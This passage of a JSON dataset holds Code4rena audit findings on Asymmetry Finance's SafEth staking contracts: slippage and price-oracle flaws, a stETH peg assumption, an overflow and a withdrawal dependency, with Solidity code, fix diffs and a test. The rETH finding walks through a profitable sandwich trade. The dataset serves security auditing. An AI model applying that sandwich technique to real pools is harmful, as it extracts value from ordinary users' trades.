slippage to it to get minOut.\n\nCurrent ratio: eth = 0.9177 rETH<br>\nETH to swap for reth: 33.3333\\~<br>\nSo minOut -> 33.3333 &ast; 0.9177 &ast; 0.99 = 30.284 rETH\n\n(see: <https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L170-L183>)\n\nContract swap 33.3333 ETH for 30.498 rETH (slippage of 0.61% so below 1% and received more than minOut)\n\nNew pool balance: 9876.86 rETH - 10828.33 ETH\n\nTX3:\n\nResearcher swap back the 92.63 rETH in for 100.61\\~ ETH<br>\nnew pool balance: 9969.49 rETH - 10727.72 ETH\n\nResearcher made 0.61\\~ ETH of profit, could be more as we only applied a 0,61% slippage but we can go as far as 1% in the current rETH contract.\n\nUniv3 pool would could even worse as Researcher with a lot of liquidity could be able to drain one side (liquidity is very concentrated), add liquidity in a tight range execute the stake and then remove liquidity and swap back.\n\n### Recommended Mitigation Steps\n\nThe rETH price should be determined using the TWAP price and users should be able to input minOut in the stake, unstake and rebalanceToWeight function.\n\n**[Picodes (judge) increased severity to High](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/142#issuecomment-1518578752)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Using Chainlink to get price instead of poolPrice.<br>\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/35), [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/29), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/12).\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the rETH derivative contract that can be bought through Uniswap if the deposit contract is not open. The vulnerability allows MEV researchers to exploit the slippage set by the contract and make a profit. This bug was given a severity rating of High by the judge.\n\nThe proof of concept for this vulnerability is as follows: if the pool has a balance of 10,000 rETH for 10,695 ETH, and a user wants to stake 100 ETH, a third of it will be staked through rETH according to a 1/3 weight for each derivative. The researcher will then swap 100 ETH in for 92.63 rETH, reducing the pool balance to 9907.36 rETH - 10795 ETH. The user will then stake their ETH, and the contract will take the current spot price of the pool and then apply 1% slippage to it to get minOut. This results in 33.3333 ETH being swapped for 30.284 rETH. Lastly, the researcher will swap back the 92.63 rETH in for 100.61 ETH, resulting in a 0.61 ETH profit.\n\nTo mitigate this vulnerability, the rETH price should be determined using the TWAP price and users should be able to input minOut in the stake, unstake and rebalanceToWeight function. This mitigation was confirmed with comments from reports from three different sources.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/142",
      "tags": [],
      "finders": [
        "skidog",
        "HollaDieWaldfee",
        "0x52",
        "yac",
        "top1st",
        "jasonxiale",
        "019EC6E2",
        "Dug",
        "pontifex",
        "kaden",
        "koxuan",
        "shuklaayush",
        "SunSec",
        "roelio",
        "0xfusion",
        "ulqiorra",
        "tank",
        "peanuts",
        "bytes032",
        "igingu",
        "IgorZuk",
        "shalaamum",
        "4lulz",
        "ernestognw",
        "0xl51",
        "carrotsmuggler",
        "nemveer",
        "MiloTruck",
        "HHK",
        "wen",
        "teddav",
        "nowonder92",
        "aviggiano",
        "m\\_Rassska",
        "a3yip6",
        "ToonVH",
        "fs0c",
        "Bauer",
        "BanPaleo",
        "Bahurum",
        "SaeedAlipoor01988",
        "bearonbike",
        "auditor0517",
        "0xbepresent",
        "Viktor\\_Cortess",
        "handsomegiraffe",
        "MadWookie",
        "Ruhum",
        "UdarTeam",
        "wait",
        "chalex",
        "0xRobocop",
        "Lirios",
        "Toshii",
        "deliriusz",
        "0xTraub",
        "0xepley",
        "0Kage",
        "n1punp",
        "latt1ce",
        "CodeFoxInc",
        "carlitox477",
        "rvierdiiev",
        "RedTiger",
        "Shogoki"
      ]
    },
    {
      "id": "19922",
      "title": "[H-07] `Reth.sol`: Withdrawals are unreliable and depend on excess `RocketDepositPool` balance which can brick the whole protocol",
      "impact": "HIGH",
      "content": "\nThe Asymmetry protocol promises that a user can call [`SafETH.unstake`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L108-L129) at all times. What I mean by that is that a user should be able at all times to burn his `SafETH` tokens and receive `ETH` in return. This requires that the derivatives held by the protocol can at all times be withdrawn (i.e. converted to `ETH`).\n\nAlso the [`rebalanceToWeights`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L138-L155) functionality requires that the derivatives can be withdrawn at all times. If a derivative cannot be withdrawn then the `rebalanceToWeights` function cannot be executed which means that the protocol cannot be adjusted to use different derivatives.\n\nFor the `WstEth` and `SfrxEth` derivatives this is achieved by swapping the derivative in a Curve pool for `ETH`. The liquidity in the respective Curve pool ensures that withdrawals can be processed at all times.\n\nThe `Reth` derivative works differently.\n\nWithdrawals are made by calling the `RocketTokenRETH.burn` function:\n\n[Link](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L107-L114)\n\n```solidity\nfunction withdraw(uint256 amount) external onlyOwner {\n    // @audit this is how rETH is converted to ETH\n    RocketTokenRETHInterface(rethAddress()).burn(amount);\n    // solhint-disable-next-line\n    (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\n        \"\"\n    );\n    require(sent, \"Failed to send Ether\");\n}\n```\n\nThe issue with this is that the `RocketTokenRETH.burn` function only allows for *excess balance* to be withdrawn. I.e. ETH that has been deposited by stakers but that is not yet staked on the Ethereum beacon chain. So Rocketpool allows users to burn `rETH` and withdraw `ETH` as long as the excess balance is sufficient.\n\nThe issue is obvious now: If there is no excess balance because enough users burn `rETH` or the Minipool capacity increases, the Asymmetry protocol is bascially unable to operate.\n\nWithdrawals are then impossible which bricks `SafEth.unstake` and `SafEth.rebalanceToWeights`.\n\n### Proof of Concept\n\nI show in this section how the current withdrawal flow for the `Reth` derivative is dependend on there being *excess balance* in the RocketDepositPool.\n\nThe current withdrawal flow calls `RocketTokenRETH.burn` which executes this code:\n\n[Link](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L106-L123)\n\n```solidity\nfunction burn(uint256 _rethAmount) override external {\n    // Check rETH amount\n    require(_rethAmount > 0, \"Invalid token burn amount\");\n    require(balanceOf(msg.sender) >= _rethAmount, \"Insufficient rETH balance\");\n    // Get ETH amount\n    uint256 ethAmount = getEthValue(_rethAmount);\n    // Get & check ETH balance\n    uint256 ethBalance = getTotalCollateral();\n    require(ethBalance >= ethAmount, \"Insufficient ETH balance for exchange\");\n    // Update balance & supply\n    _burn(msg.sender, _rethAmount);\n    // Withdraw ETH from deposit pool if required\n    withdrawDepositCollateral(ethAmount);\n    // Transfer ETH to sender\n    msg.sender.transfer(ethAmount);\n    // Emit tokens burned event\n    emit TokensBurned(msg.sender, _rethAmount, ethAmount, block.timestamp);\n}\n```\n\nThis executes `withdrawDepositCollateral(ethAmount)`:\n\n[Link](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/token/RocketTokenRETH.sol#L126-L133)\n\n```solidity\nfunction withdrawDepositCollateral(uint256 _ethRequired) private {\n    // Check rETH contract balance\n    uint256 ethBalance = address(this).balance;\n    if (ethBalance >= _ethRequired) { return; }\n    // Withdraw\n    RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(getContractAddress(\"rocketDepositPool\"));\n    rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance));\n}\n```\n\nThis then calls `rocketDepositPool.withdrawExcessBalance(_ethRequired.sub(ethBalance))` to get the `ETH` from the *excess balance*:\n\n[Link](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L194-L206)\n\n```solidity\nfunction withdrawExcessBalance(uint256 _amount) override external onlyThisLatestContract onlyLatestContract(\"rocketTokenRETH\", msg.sender) {\n    // Load contracts\n    RocketTokenRETHInterface rocketTokenRETH = RocketTokenRETHInterface(getContractAddress(\"rocketTokenRETH\"));\n    RocketVaultInterface rocketVault = RocketVaultInterface(getContractAddress(\"rocketVault\"));\n    // Check amount\n    require(_amount <= getExcessBalance(), \"Insufficient excess balance for withdrawal\");\n    // Withdraw ETH from vault\n    rocketVault.withdrawEther(_amount);\n    // Transfer to rETH contract\n    rocketTokenRETH.depositExcess{value: _amount}();\n    // Emit excess withdrawn event\n    emit ExcessWithdrawn(msg.sender, _amount, block.timestamp);\n}\n```\n\nAnd this function reverts if the *excess balance* is insufficient which you can see in the `require(_amount <= getExcessBalance(), \"Insufficient excess balance for withdrawal\");` check.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe solution for this issue is to have an alternative withdrawal mechanism in case the *excess balance* in the RocketDepositPool is insufficient to handle the withdrawal.\n\nThe alternative withdrawal mechanism is to sell the `rETH` tokens via the Uniswap pool.\n\nYou can use the [`RocketDepositPool.getExcessBalance`](https://github.com/rocket-pool/rocketpool/blob/967e4d3c32721a84694921751920af313d1467af/contracts/contract/deposit/RocketDepositPool.sol#L59-L67) to check if there is sufficient excess `ETH` to withdraw from Rocketpool or if the withdrawal must be made via Uniswap.\n\nThe pseudocode of the new withdraw flow looks like this:\n\n    function withdraw(uint256 amount) external onlyOwner {\n        if (rocketDepositPool excess balance is sufficient) {\n            RocketTokenRETHInterface(rethAddress()).burn(amount);\n            // solhint-disable-next-line\n            (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\n                \"\"\n            );\n            require(sent, \"Failed to send Ether\");\n        } else {\n            // swap rETH for ETH via Uniswap pool\n        }\n    }\n\nI also wrote the code for the changes that I suggest:\n\n```diff\ndiff --git a/contracts/SafEth/derivatives/Reth.sol b/contracts/SafEth/derivatives/Reth.sol\nindex b6e0694..b699d5c 100644\n--- a/contracts/SafEth/derivatives/Reth.sol\n+++ b/contracts/SafEth/derivatives/Reth.sol\n@@ -105,11 +105,24 @@ contract Reth is IDerivative, Initializable, OwnableUpgradeable {\n         @notice - Convert derivative into ETH\n      */\n     function withdraw(uint256 amount) external onlyOwner {\n-        RocketTokenRETHInterface(rethAddress()).burn(amount);\n-        // solhint-disable-next-line\n-        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\n-            \"\"\n-        );\n+        if (canWithdrawFromRocketPool(amount)) {\n+            RocketTokenRETHInterface(rethAddress()).burn(amount);\n+            // solhint-disable-next-line\n+        } else {\n+\n+            uint256 minOut = ((((poolPrice() * amount) / 10 ** 18) *\n+                ((10 ** 18 - maxSlippage))) / 10 ** 18);\n+\n+            IWETH(W_ETH_ADDRESS).deposit{value: msg.value}();\n+            swapExactInputSingleHop(\n+                rethAddress(),\n+                W_ETH_ADDRESS,\n+                500,\n+                amount,\n+                minOut\n+            );\n+        }\n+        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\"\");\n         require(sent, \"Failed to send Ether\");\n     }\n \n@@ -149,6 +162,21 @@ contract Reth is IDerivative, Initializable, OwnableUpgradeable {\n             _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit();\n     }\n \n+    function canWithdrawFromRocketPool(uint256 _amount) private view returns (bool) {\n+        address rocketDepositPoolAddress = RocketStorageInterface(\n+            ROCKET_STORAGE_ADDRESS\n+        ).getAddress(\n+                keccak256(\n+                    abi.encodePacked(\"contract.address\", \"rocketDepositPool\")\n+                )\n+            );\n+        RocketDepositPoolInterface rocketDepositPool = RocketDepositPoolInterface(\n+                rocketDepositPoolAddress\n+            );\n+        uint256 _ethAmount = RocketTokenRETHInterface(rethAddress()).getEthValue(_amount);\n+        return rocketDepositPool.getExcessBalance() >= _ethAmount;\n+    }\n+\n```\n\n\n**[toshiSat (Asymmetry) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/210#issuecomment-1500642915):**\n > The deposit pool is mostly always full, but the warden does have a point and we should allow for multiple options.\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Check if withdraw from deposit contract possible.<br>\n\n**Status:** Sub-optimally mitigated. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/56), [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/41), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/11).\n\n\n\n***\n\n",
      "summary": "\nThe Asymmetry protocol promises that a user can call [`SafETH.unstake`](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L108-L129) at all times, allowing a user to burn their `SafETH` tokens and receive `ETH` in return. This requires that the derivatives held by the protocol can be withdrawn (i.e. converted to `ETH`).\n\nThe `Reth` derivative works differently than the `WstETH` and `SfrxETH` derivatives. Withdrawals are made by calling the `RocketTokenRETH.burn` function, but the issue is that the `RocketTokenRETH.burn` function only allows for *excess balance* to be withdrawn. If there is no excess balance, the Asymmetry protocol is unable to operate.\n\nThe solution for this issue is to have an alternative withdrawal mechanism in case the *excess balance* in the RocketDepositPool is insufficient to handle the withdrawal. This can be done by swapping the `rETH` tokens via the Uniswap pool. The `RocketDepositPool.getExcessBalance` can be used to check if there is sufficient excess `ETH` to withdraw from Rocketpool or if the withdrawal must be made via Uniswap.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/210",
      "tags": [],
      "finders": [
        "carrotsmuggler",
        "d3e4",
        "HollaDieWaldfee",
        "Cryptor",
        "0x52",
        "ToonVH",
        "MiloTruck",
        "HHK",
        "0xRobocop",
        "igingu",
        "adriro",
        "0Kage"
      ]
    },
    {
      "id": "19921",
      "title": "[H-06] `WstEth` derivative assumes a `~1=1` peg of stETH to ETH",
      "impact": "HIGH",
      "content": "\nThe `WstEth` contract implements the ETH derivative for the Lido protocol. The stETH token is the liquid representation of the ETH staked in this protocol.\n\nThere are two different places in the codebase that indicate that the implementation is assuming a peg of 1 ETH \\~= 1 stETH, each with different consequences. Even though both tokens have a tendency to keep the peg, this hasn't been always the case as it can be seen in [this charth](https://nomics.com/exchanges/curve-curve-finance-ethereum/markets/0xae7ab96520de3a18e5e111b5eaab095312d7fe84-0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee) or [this dashboard](https://dune.com/LidoAnalytical/Curve-ETHstETH). There have been many episodes of market volatility that affected the price of stETH, notably the one in last June when stETH traded at \\~0.93 ETH.\n\nThe first indication of such an assumption is the implementation of `ethPerDerivative`. This function is intended to work as an estimation of the current value in ETH of one unit (1e18) of the underlying asset. In this implementation, the function simply queries the amount of stETH for one unit (1e18) of wstETH and returns that value, which clearly indicates a conversion rate of 1 stETH = 1 ETH.\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L86-L88>\n\n```solidity\nfunction ethPerDerivative(uint256 _amount) public view returns (uint256) {\n    return IWStETH(WST_ETH).getStETHByWstETH(10 ** 18);\n}\n```\n\nThe other indication and most critical one is in the `withdraw` function. This function is used by the `SafEth` contract to unstake user positions and rebalance weights. In the implementation for the `WstEth` derivative, the function will unwrap the wstETH for stETH and use the Curve pool to exchange the stETH for ETH:\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67>\n\n```solidity\n56:     function withdraw(uint256 _amount) external onlyOwner {\n57:         IWStETH(WST_ETH).unwrap(_amount);\n58:         uint256 stEthBal = IERC20(STETH_TOKEN).balanceOf(address(this));\n59:         IERC20(STETH_TOKEN).approve(LIDO_CRV_POOL, stEthBal);\n60:         uint256 minOut = (stEthBal * (10 ** 18 - maxSlippage)) / 10 ** 18;\n61:         IStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut);\n62:         // solhint-disable-next-line\n63:         (bool sent, ) = address(msg.sender).call{value: address(this).balance}(\n64:             \"\"\n65:         );\n66:         require(sent, \"Failed to send Ether\");\n67:     }\n```\n\nThe issue is the calculation of the `minOut` variable that is sent to the Curve `exchange` function to validate the output amount of the trade. As we can see in line 60, the calculation is simply applying the slippage percentage to stETH balance. This means that for example, given the default slippage value of 1%, trading 1 stETH will succeed only if the rate is above 0.99. Larger amounts will be more concerning as the Curve AMM implements non-linear invariants, the price impact will be bigger. The `rebalanceToWeights` function withdraws **all the balance** before rebalancing, which means it will try to swap all the stETH held by the contract.\n\nThis could be mitigated by adjusting the `maxSlippage` variable to allow for lower exchange rates. However this would imply additional issues. First, the `setMaxSlippage` is an admin function that needs to be manually updated with extreme care. In times of high volatility the owners won't be able to update this variable as frequently as needed to keep up with the exchange rate. This means that users that want to exit their position won't be able to do so since the exchange for this derivative will fail (see PoC for a detailed example). Second, on the contrary, if the owners decide to set a higher slippage value by default to allow for unexpected market conditions, withdrawals and rebalancing (in particular) will be victim of sandwich attacks by MEV bots.\n\n### Proof of Concept\n\nThe following test replicates the market conditions during last June where stETH was trading at 0.93 ETH (needs to be forked from mainnet at block \\~15000000). Here, the user wants to exit their position but the call to `unstake` will revert since the exchange in the Curve pool will fail as the output amount will be less than the expected minimum.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/a2895a85360276cf4f29d23de3282859).\n\n```solidity\n// Run this test forking mainnet at block height 15000000\nfunction test_WstEth_withdraw_AssumesPegToEth() public {\n    // Setup derivative\n    vm.prank(deployer);\n    safEth.addDerivative(address(wstEth), 1e18);\n\n    // Deal balance to user\n    uint256 depositValue = 1 ether;\n    vm.deal(user, depositValue);\n\n    // user stakes ether\n    vm.prank(user);\n    safEth.stake{value: depositValue}();\n\n    // user tries to unstake, action will fail due to stETH being prices at around 0.93-0.95 ETH\n    uint256 userShares = safEth.balanceOf(user);\n    vm.prank(user);\n    vm.expectRevert(\"Exchange resulted in fewer coins than expected\");\n    safEth.unstake(userShares);\n}\n```\n\n### Recommendation\n\nThe user should be able to decide on the slippage and set the expected minimum output amount to correctly handle different market conditions and user expectations. Similar to how decentralized exchanges work, the user experience can be improved by using a front-end that queries current exchange rates and offers the user a preview of the estimated output amount.\n\nThe `ethPerDerivative` function should also take into account the results of swapping the stETH for ETH using the Curve pool, similar to how the `SfrxEth` derivative implementation works.\n\n**[toshiSat (Asymmetry) confirmed](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588#issuecomment-1500489141)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Using Chainlink to get price instead of assuming 1:1.<br>\n\n**Status:** Not fully mitigated. Full details in reports from [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/40) and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/13) - and also shared below in the [Mitigation Review](#mitigation-review) section.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `WstEth` contract which implements the ETH derivative for the Lido protocol. The stETH token is the liquid representation of the ETH staked in this protocol. However, there have been many episodes of market volatility that affected the price of stETH, notably the one in last June when stETH traded at ~0.93 ETH. \n\nThe bug exists in two different places in the codebase. The first indication is the implementation of `ethPerDerivative` which queries the amount of stETH for one unit (1e18) of wstETH and returns that value, which clearly indicates a conversion rate of 1 stETH = 1 ETH. The other indication is in the `withdraw` function which will try to swap all the stETH held by the contract. The calculation of the `minOut` variable is simply applying the slippage percentage to stETH balance, which means that for example, given the default slippage value of 1%, trading 1 stETH will succeed only if the rate is above 0.99.\n\nThe Proof of Concept test replicates the market conditions during last June where stETH was trading at 0.93 ETH. Here, the user wants to exit their position but the call to `unstake` will revert since the exchange in the Curve pool will fail as the output amount will be less than the expected minimum.\n\nThe recommendation to mitigate this bug is to allow the user to decide on the slippage and set the expected minimum output amount to correctly handle different market conditions and user expectations. The `ethPerDerivative` function should also take into account the results of swapping the stETH for ETH using the Curve pool. As of now, the bug has not been fully mitigated.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "sinarette",
        "NoamYakov",
        "y1cunhui",
        "jasonxiale",
        "0xMirce",
        "koxuan",
        "Emmanuel",
        "shaka",
        "peanuts",
        "igingu",
        "IgorZuk",
        "ad3sh\\_",
        "carrotsmuggler",
        "lukris02",
        "MiloTruck",
        "rbserver",
        "RedTiger",
        "eyexploit",
        "T1MOH",
        "tnevler",
        "adriro",
        "Franfran",
        "Co0nan",
        "Bauer",
        "Bahurum",
        "handsomegiraffe",
        "auditor0517",
        "Ruhum",
        "Tricko",
        "0xRajkumar",
        "0xepley",
        "BPZ",
        "bin2chen",
        "nadin",
        "rvierdiiev",
        "monrel"
      ]
    },
    {
      "id": "19920",
      "title": "[H-05] Reth `poolPrice` calculation may overflow",
      "impact": "HIGH",
      "content": "\nThe Reth derivative contract implements the `poolPrice` function to get the spot price of the derivative asset using a Uniswap V3 pool. The function queries the pool to fetch the `sqrtPriceX96` and does the following calculation:\n\n<https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242>\n\n```solidity\nfunction poolPrice() private view returns (uint256) {\n    address rocketTokenRETHAddress = RocketStorageInterface(\n        ROCKET_STORAGE_ADDRESS\n    ).getAddress(\n            keccak256(\n                abi.encodePacked(\"contract.address\", \"rocketTokenRETH\")\n            )\n        );\n    IUniswapV3Factory factory = IUniswapV3Factory(UNI_V3_FACTORY);\n    IUniswapV3Pool pool = IUniswapV3Pool(\n        factory.getPool(rocketTokenRETHAddress, W_ETH_ADDRESS, 500)\n    );\n    (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();\n    return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) >> (96 * 2);\n}\n```\n\nThe main issue here is that the multiplications in the expression `sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)` may eventually overflow. This case is taken into consideration by the implementation of the [OracleLibrary.getQuoteAtTick](https://docs.uniswap.org/contracts/v3/reference/periphery/libraries/OracleLibrary#getquoteattick) function which is part of the Uniswap V3 periphery set of contracts.\n\n<https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69>\n\n```solidity\n49:     function getQuoteAtTick(\n50:         int24 tick,\n51:         uint128 baseAmount,\n52:         address baseToken,\n53:         address quoteToken\n54:     ) internal pure returns (uint256 quoteAmount) {\n55:         uint160 sqrtRatioX96 = TickMath.getSqrtRatioAtTick(tick);\n56: \n57:         // Calculate quoteAmount with better precision if it doesn't overflow when multiplied by itself\n58:         if (sqrtRatioX96 <= type(uint128).max) {\n59:             uint256 ratioX192 = uint256(sqrtRatioX96) * sqrtRatioX96;\n60:             quoteAmount = baseToken < quoteToken\n61:                 ? FullMath.mulDiv(ratioX192, baseAmount, 1 << 192)\n62:                 : FullMath.mulDiv(1 << 192, baseAmount, ratioX192);\n63:         } else {\n64:             uint256 ratioX128 = FullMath.mulDiv(sqrtRatioX96, sqrtRatioX96, 1 << 64);\n65:             quoteAmount = baseToken < quoteToken\n66:                 ? FullMath.mulDiv(ratioX128, baseAmount, 1 << 128)\n67:                 : FullMath.mulDiv(1 << 128, baseAmount, ratioX128);\n68:         }\n69:     }\n```\n\nNote that this implementation guards against different numerical issues. In particular, the if in line 58 checks for a potential overflow of `sqrtRatioX96` and switches the implementation to avoid the issue.\n\n### Recommendation\n\nThe `poolPrice` function can delegate the calculation directly to the [OracleLibrary.getQuoteAtTick](https://docs.uniswap.org/contracts/v3/reference/periphery/libraries/OracleLibrary#getquoteattick) function of the `v3-periphery` package:\n\n```solidity\nfunction poolPrice() private view returns (uint256) {\n    address rocketTokenRETHAddress = RocketStorageInterface(\n        ROCKET_STORAGE_ADDRESS\n    ).getAddress(\n            keccak256(\n                abi.encodePacked(\"contract.address\", \"rocketTokenRETH\")\n            )\n        );\n    IUniswapV3Factory factory = IUniswapV3Factory(UNI_V3_FACTORY);\n    IUniswapV3Pool pool = IUniswapV3Pool(\n        factory.getPool(rocketTokenRETHAddress, W_ETH_ADDRESS, 500)\n    );\n    (, int24 tick, , , , , ) = pool.slot0();\n    return OracleLibrary.getQuoteAtTick(tick, 1e18, rocketTokenRETHAddress, W_ETH_ADDRESS);\n}\n```\n\n**[toshiSat (Asymmetry) disputed via duplicate issue `#693`](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/693#issuecomment-1500457920)**\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Using Chainlink to get price instead of poolPrice.<br>\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/33), [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/28), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/6).\n\n\n\n***\n\n",
      "summary": "\nA bug was reported in the `poolPrice` function of the Reth derivative contract. This function is used to get the spot price of the derivative asset using a Uniswap V3 pool. The issue is that the multiplications in the expression `sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)` may eventually overflow. The implementation of the OracleLibrary.getQuoteAtTick function, which is part of the Uniswap V3 periphery set of contracts, guards against this numerical issue. \n\nThe recommended mitigation is to delegate the calculation directly to the OracleLibrary.getQuoteAtTick function. The bug was disputed via a duplicate issue and the mitigation was confirmed with comments from d3e4, adriro, and 0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/593",
      "tags": [],
      "finders": [
        "hassan-truscova",
        "0x52",
        "T1MOH",
        "cloudjunky",
        "adriro",
        "anodaram"
      ]
    },
    {
      "id": "19919",
      "title": "[H-04] Price of sfrxEth derivative is calculated incorrectly",
      "impact": "HIGH",
      "content": "\nIn the [ethPerDerivative()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117), the calculated `frxAmount` is multiplied by (10 &ast;&ast; 18) and divided by `price_oracle`, but it must be multiplied by `price_oracle` and divided by (10 &ast;&ast; 18).\n\nThe impact is severe as [ethPerDerivative()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117) function is used in [stake()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101), one of  two main functions a user will interact with. The value returned by [ethPerDerivative()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117) affects the calculations of [`mintAmount`](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L98). The incorrect calculation may over or understate the amount of safEth received by the user.\n\n[ethPerDerivative()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117) is also used in the [withdraw()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L60-L88) function when calculating [`minOut`](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L74). So, incorrect calculation of ethPerDerivative() may increase/decrease slippage. This can cause unexpected losses or function revert. If [withdraw()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L60-L88) function reverts, the function [unstake()](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129) is unavailable => assets are locked.\n\n### Proof of Concept\n\nWe need to calculate: (10 &ast;&ast; 18) sfrxEth = X Eth.\n\nFor example, we `convertToAssets(10 ** 18)` and get `frxAmount` = 1031226769652703996. `price_oracle` returns 998827832404234820. So, (10 &ast;&ast; 18) frxEth costs 998827832404234820 Eth. Thus, (10 &ast;&ast; 18) sfrxEth costs `frxAmount * price_oracle / 10 ** 18` = 1031226769652703996 &ast; 998827832404234820 / 10 &ast;&ast; 18 Eth (1030017999049431492 Eth).\n\nBut [this function](https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117):\n\n        function ethPerDerivative(uint256 _amount) public view returns (uint256) {\n            uint256 frxAmount = IsFrxEth(SFRX_ETH_ADDRESS).convertToAssets(\n                10 ** 18\n            );\n            return ((10 ** 18 * frxAmount) /\n                IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle());\n        }\n\ncalculates the cost of sfrxEth as ` 10 ** 18 * frxAmount / price_oracle  ` = 10 &ast;&ast; 18 &ast; 1031226769652703996 / 998827832404234820 Eth (1032436958800480269 Eth). The current difference \\~ 0.23% but it can be 